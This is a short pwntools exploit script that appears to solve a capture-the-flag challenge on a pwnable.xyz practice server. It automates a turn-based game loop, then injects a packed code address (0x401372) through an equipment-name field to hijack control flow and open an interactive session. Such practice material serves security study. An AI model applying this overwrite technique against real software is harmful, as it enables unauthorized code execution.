#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30020)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000


def use_skill():
    io.recvuntil("do you want to use : ")
    io.sendline('1')
    io.recvuntil("================")
    io.recvuntil("0 - Hydramist (Priest) [")
    h1 = int(io.recvuntil("/", drop = True))
    io.recvuntil("1 - Random Bob (Rogue) [")
    h2 = int(io.recvuntil("/", drop = True))
    log.info("\033[33m" + hex(h1) + "\033[0m")
    log.info("\033[33m" + hex(h2) + "\033[0m")
    io.recvuntil("skill on : ")
    if h1 != 0:
        io.sendline('0')
        return
    if h2 != 0:
        io.sendline('1')
        return

while True:
    io.recvuntil("Round (")
    level = io.recvuntil(")", drop = True)
    print(level)
    if level == 'END':
        io.recvuntil("Team '")
        win_name = io.recvuntil("'", drop = True)
        if win_name == 'SmiteAllDay':
            continue
        io.recvuntil("Congratulations, you're now a '")
        now_name = io.recvuntil("'", drop = True)
        print(now_name)
        if now_name == 'Duelist':
            break
    if level == 'Player':
        use_skill()

# now change equipment
io.recvuntil("(y/n)?")
io.sendline('y')
io.recvuntil("Name for your equip: ")
io.sendline(p64(0x401372) * 2)
pause()

while True:
    io.recvuntil("Round (")
    level = io.recvuntil(")", drop = True)
    print(level)
    if level == 'END':
        io.recvuntil("Team '")
        win_name = io.recvuntil("'", drop = True)
        io.recvuntil("re now a '")
        now_name = io.recvuntil("'", drop = True)
        print(now_name)
        if now_name == 'Gladiator':
            break
    if level == 'Player':
        use_skill()


io.interactive()



